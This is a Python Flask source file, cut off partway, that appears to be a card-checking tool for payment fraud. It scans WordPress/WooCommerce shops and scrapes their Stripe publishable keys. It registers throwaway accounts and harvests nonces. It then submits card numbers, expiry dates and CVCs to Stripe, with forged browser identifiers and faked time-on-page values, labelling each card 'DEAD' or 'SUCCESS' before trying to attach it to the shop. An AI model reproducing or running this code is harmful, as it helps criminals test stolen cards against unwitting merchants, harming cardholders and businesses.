from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import string
import logging
import re
from datetime import datetime
import time
from urllib.parse import urlparse, urljoin
import os

app = Flask(__name__)
CORS(app)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

API_KEY = os.getenv('API_KEY', '@teamlegendno1')

def generate_stripe_identifiers():
    """Generate random Stripe browser identifiers (GUID, MUID, SID)."""
    guid = ''.join(random.choices(string.hexdigits.lower(), k=8)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=12)) + \
           ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    muid = ''.join(random.choices(string.hexdigits.lower(), k=8)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
           ''.join(random.choices(string.hexdigits.lower(), k=12)) + \
           ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    sid = ''.join(random.choices(string.hexdigits.lower(), k=8)) + '-' + \
          ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
          ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
          ''.join(random.choices(string.hexdigits.lower(), k=4)) + '-' + \
          ''.join(random.choices(string.hexdigits.lower(), k=12)) + \
          ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    return guid, muid, sid


class SiteDetector:
    """Auto-detect site type and extract Stripe configuration."""
    
    def __init__(self, site_url):
        self.site_url = site_url if site_url.startswith('http') else f'https://{site_url}'
        self.site_url = self.site_url.rstrip('/')
        self.domain = urlparse(self.site_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        })
        
    def detect_wordpress(self):
        """Detect if site is WordPress - with retry logic."""
        for attempt in range(3):
            try:
                response = self.session.get(self.site_url, timeout=45, allow_redirects=True)
                indicators = [
                    '/wp-content/' in response.text,
                    '/wp-includes/' in response.text,
                    'wordpress' in response.text.lower(),
                    'wp-json' in response.text.lower(),
                    'wp-admin' in response.text.lower(),
                    '/wp-login.php' in response.text
                ]
                if any(indicators):
                    return True
                
                try:
                    wp_json = self.session.get(urljoin(self.site_url, '/wp-json/'), timeout=20)
                    if wp_json.status_code == 200:
                        return True
                except:
                    pass
                
                if attempt < 2:
                    return False
                    
                return False
            except requests.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(3)
                    continue
                logging.warning(f"Timeout detecting WordPress on {self.site_url}")
                return False
            except Exception as e:
                if attempt < 2:
                    time.sleep(2)
                    continue
                logging.warning(f"Error detecting WordPress on {self.site_url}: {e}")
                return False
        return False
    
    def detect_woocommerce(self):
        """Detect if site uses WooCommerce - with retry logic."""
        for attempt in range(3):
            try:
                response = self.session.get(self.site_url, timeout=45, allow_redirects=True)
                html = response.text.lower()
                indicators = [
                    'woocommerce' in html,
                    '/wp-content/plugins/woocommerce/' in html,
                    'wc-ajax' in html,
                    'class="woocommerce' in html,
                    'wc_add_to_cart' in html,
                    'wc-stripe' in html,
                    'add-to-cart' in html
                ]
                
                if sum(indicators) >= 1:
                    return True
                
                try:
                    checkout = self.session.get(urljoin(self.site_url, '/checkout/'), timeout=20)
                    if 'woocommerce' in checkout.text.lower() or 'checkout' in checkout.text.lower():
                        return True
                except:
                    pass
                
                try:
                    my_account = self.session.get(urljoin(self.site_url, '/my-account/'), timeout=20)
                    if 'woocommerce' in my_account.text.lower():
                        return True
                except:
                    pass
                
                if attempt < 2:
                    return False
                    
                return False
            except requests.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(3)
                    continue
                logging.warning(f"Timeout detecting WooCommerce on {self.site_url}")
                return False
            except Exception as e:
                if attempt < 2:
                    time.sleep(2)
                    continue
                logging.warning(f"Error detecting WooCommerce on {self.site_url}: {e}")
                return False
        return False
    
    def find_payment_pages(self):
        """Find payment-related pages."""
        pages = []
        paths = [
            '/my-account/',
            '/checkout/',
            '/cart/',
            '/my-account/payment-methods/',
            '/my-account/add-payment-method/'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=30)
                if r.status_code == 200:
                    pages.append(url)
            except:
                pass
        
        return pages
    
    def extract_stripe_key(self):
        """Extract Stripe publishable key from site - Enhanced version."""
        urls_to_check = [self.site_url] + self.find_payment_pages()
        
        for url in urls_to_check:
            try:
                response = self.session.get(url, timeout=45, allow_redirects=True)
                
                patterns = [
                    r'(pk_live_[a-zA-Z0-9]{24,107})',
                    r'(pk_test_[a-zA-Z0-9]{24,107})',
                    r'"(pk_(?:test|live)_[a-zA-Z0-9]{24,})"',
                    r"'(pk_(?:test|live)_[a-zA-Z0-9]{24,})'",
                    r'data-key=["\']?(pk_(?:test|live)_[a-zA-Z0-9]{24,})["\']?',
                    r'publishableKey["\']?\s*[:=]\s*["\']?(pk_(?:test|live)_[a-zA-Z0-9]{24,})',
                    r'stripe_key["\']?\s*[:=]\s*["\']?(pk_(?:test|live)_[a-zA-Z0-9]{24,})',
                    r'STRIPE_KEY["\']?\s*[:=]\s*["\']?(pk_(?:test|live)_[a-zA-Z0-9]{24,})',
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, response.text)
                    if matches:
                        for match in matches:
                            key = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
                            if key.startswith('pk_') and len(key) > 30:
                                logging.info(f"Found Stripe key in HTML: {key[:20]}...")
                                return key
                
                js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', response.text)
                for js_file in js_files[:10]:
                    try:
                        js_url = urljoin(url, js_file)
                        if 'stripe' in js_file.lower() or 'checkout' in js_file.lower() or 'payment' in js_file.lower():
                            js_response = self.session.get(js_url, timeout=20)
                            for pattern in patterns:
                                matches = re.findall(pattern, js_response.text)
                                if matches:
                                    for match in matches:
                                        key = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
                                        if key.startswith('pk_') and len(key) > 30:
                                            logging.info(f"Found Stripe key in JS file: {key[:20]}...")
                                            return key
                    except:
                        continue
                
                all_pks = re.findall(r'pk_[a-z]+_[a-zA-Z0-9]+', response.text)
                for pk in all_pks:
                    if len(pk) > 30:
                        logging.info(f"Found Stripe key (fallback): {pk[:20]}...")
                        return pk
                        
            except Exception as e:
                logging.debug(f"Error extracting key from {url}: {e}")
                continue
        
        return None
    
    def get_account_page(self):
        """Get my-account page URL - Enhanced detection."""
        paths = [
            '/my-account/',
            '/my-account',
            '/account/',
            '/customer/account/',
            '/user/account/',
            '/member/',
            '/login/',
            '/register/'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=30, allow_redirects=True)
                if r.status_code == 200 and ('register' in r.text.lower() or 'sign up' in r.text.lower() or 'create account' in r.text.lower()):
                    logging.info(f"Found account page at: {url}")
                    return url
            except:
                pass
        
        try:
            response = self.session.get(self.site_url, timeout=30)
            account_links = re.findall(r'href=["\']([^"\']*(?:my-account|account|register|login)[^"\']*)["\']', response.text, re.I)
            for link in account_links[:5]:
                try:
                    url = urljoin(self.site_url, link)
                    r = self.session.get(url, timeout=20, allow_redirects=True)
                    if r.status_code == 200 and 'register' in r.text.lower():
                        logging.info(f"Found account page via link: {url}")
                        return url
                except:
                    continue
        except:
            pass
        
        return urljoin(self.site_url, '/my-account/')


def generate_random_credentials():
    """Generate random email and password for registration."""
    timestamp = int(time.time())
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"user{timestamp}{random_string}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    username = f"user{timestamp}{random_string}"
    return email, password, username


def register_account_dynamic(site_url):
    """Register a new account on any WordPress/WooCommerce site."""
    session = requests.Session()
    email, password, username = generate_random_credentials()
    
    detector = SiteDetector(site_url)
    account_url = detector.get_account_page()
    
    logging.info(f"Attempting registration on: {account_url}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }
    
    try:
        response = session.get(account_url, headers=headers, timeout=45, allow_redirects=True)
        
        nonce = None
        nonce_patterns = [
            r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'name="_wpnonce"\s+value="([^"]+)"',
            r'name="register-nonce"\s+value="([^"]+)"'
        ]
        
        for pattern in nonce_patterns:
            match = re.search(pattern, response.text)
            if match:
                nonce = match.group(1)
                logging.info(f"Found nonce: {nonce[:10]}...")
                break
        
        referer_match = re.search(r'name="_wp_http_referer"\s+value="([^"]+)"', response.text)
        referer = referer_match.group(1) if referer_match else '/my-account/'
        
    except Exception as e:
        return False, None, None, f"Page fetch error: {e}"
    
    try:
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
        }
        
        if nonce:
            reg_data['woocommerce-register-nonce'] = nonce
            reg_data['_wpnonce'] = nonce
        
        reg_data['_wp_http_referer'] = referer
        reg_data['register'] = 'Register'
        
        parsed_url = urlparse(account_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        reg_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Referer': account_url,
        }
        
        response = session.post(account_url, data=reg_data, headers=reg_headers, timeout=45, allow_redirects=True)
        
        cookies_dict = session.cookies.get_dict()
        has_login_cookie = any('wordpress_logged_in' in key for key in cookies_dict.keys())
        
        success_indicators = [
            has_login_cookie,
            'logout' in response.text.lower(),
            'log out' in response.text.lower(),
            'sign out' in response.text.lower(),
            'dashboard' in response.text.lower() and response.status_code == 200,
            'welcome' in response.text.lower() and response.status_code == 200,
            any('woocommerce-message' in response.text for x in [1])
        ]
        
        if any(success_indicators):
            try:
                payment_urls = [
                    urljoin(base_url, '/my-account/add-payment-method/'),
                    urljoin(base_url, '/my-account/payment-methods/'),
                    urljoin(base_url, '/checkout/')
                ]
                
                ajax_nonce = None
                for payment_url in payment_urls:
                    try:
                        payment_page = session.get(payment_url, headers=headers, timeout=30)
                        
                        nonce_patterns = [
                            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"',
                            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
                            r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
                            r'"add_card_nonce"\s*:\s*"([a-f0-9]{10})"',
                            r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})',
                            r'wc_stripe_params.*?nonce["\']?\s*:\s*["\']([a-f0-9]{10})'
                        ]
                        
                        for pattern in nonce_patterns:
                            match = re.search(pattern, payment_page.text, re.DOTALL)
                            if match:
                                ajax_nonce = match.group(1)
                                logging.info(f"Found ajax nonce: {ajax_nonce}")
                                break
                        
                        if ajax_nonce:
                            break
                    except:
                        continue
                
                final_nonce = ajax_nonce if ajax_nonce else '0746bbffaa'
                logging.info(f"Registration successful! Nonce: {final_nonce}")
                return True, session, final_nonce, "Registration successful"
            except Exception as e:
                return True, session, '0746bbffaa', "Registration successful (using default nonce)"
        else:
            return False, None, None, f"Registration failed - HTTP {response.status_code}"
            
    except Exception as e:
        return False, None, None, f"Registration error: {e}"


def get_stripe_payment_token(card_info: str, stripe_key: str):
    """Get Stripe payment token with auto-generated identifiers."""
    try:
        card_number, exp_month, exp_year, cvc = card_info.replace(" ", "").split('|')
        exp_year = exp_year[-2:]
    except ValueError:
        return 'DEAD', "Invalid card format"

    guid, muid, sid = generate_stripe_identifiers()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    time_on_page = random.randint(25000, 45000)
    
    data = (
        f'type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}'
        '&allow_redisplay=unspecified'
        '&billing_details[address][country]=US'
        '&payment_user_agent=stripe.js%2F2a60804053%3B+stripe-js-v3%2F2a60804053%3B+payment-element%3B+deferred-intent'
        f'&time_on_page={time_on_page}'
        f'&guid={guid}&muid={muid}&sid={sid}'
        f'&key={stripe_key}'
        '&_stripe_version=2024-06-20'
    )

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
        response_data = response.json()
        
        if response.status_code == 200 and 'id' in response_data:
            return 'SUCCESS', response_data['id']
        else:
            error_message = response_data.get('error', {}).get('message', 'Unknown Stripe error')
            return 'DEAD', f"Stripe Token Error: {error_message}"

    except requests.exceptions.RequestException as e:
        return 'DEAD', f"Request Error: {e}"


def add_card_to_website_dynamic(payment_method_id: str, session, ajax_nonce, site_url, retry_count=0):
    """Add card to any WordPress/WooCommerce site."""
    parsed_url = urlparse(site_url if site_url.startswith('http') else f'https://{site_url}')
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    headers = {
        'authority': parsed_url.netloc,
        'accept': '*/*',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': base_url,
        'referer': urljoin(base_url, '/my-account/add-payment-method/'),
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    try:
        payment_page = sessio
